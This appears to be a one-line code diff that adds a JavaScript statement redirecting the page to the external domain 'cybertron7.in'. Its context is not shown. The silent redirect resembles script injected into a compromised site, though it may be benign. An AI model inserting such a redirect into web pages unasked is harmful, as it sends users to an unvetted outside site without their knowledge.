@@ -1,0 +1,1 @@
+window.location.href="https://cybertron7.in";
